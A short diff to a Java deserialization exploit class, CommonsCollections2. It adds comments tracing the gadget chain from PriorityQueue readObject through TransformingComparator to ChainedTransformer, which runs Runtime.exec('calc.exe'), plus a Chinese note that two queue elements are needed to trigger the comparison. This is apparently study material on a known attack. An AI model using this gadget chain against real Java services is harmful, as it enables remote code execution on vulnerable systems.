@@ -21,6 +21,15 @@ public class CommonsCollections2 {
         field.set(obj, value);
     }
 
+    /**
+     * PriorityQueue#readObject()
+     * PriorityQueue#heapify()
+     * PriorityQueue#siftDown()
+     * PriorityQueue#siftDownUsingComparator()
+     *      TransformingComparator#compare(obj1,obj2)
+     *          ChainedTransformer#transform(obj1) === RunTime.getRunTime.exec("calc.exe")
+     */
+
     public static void main(String[] args) throws Exception {
         Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
         Transformer[] transformers = new Transformer[] {
@@ -38,6 +47,7 @@ public class CommonsCollections2 {
         Comparator comparator = new TransformingComparator(transformerChain);
 
         PriorityQueue queue = new PriorityQueue(2, comparator);
+        // 至少需要2个元素才会触发排序和比较
         queue.add(1);
         queue.add(2);
 
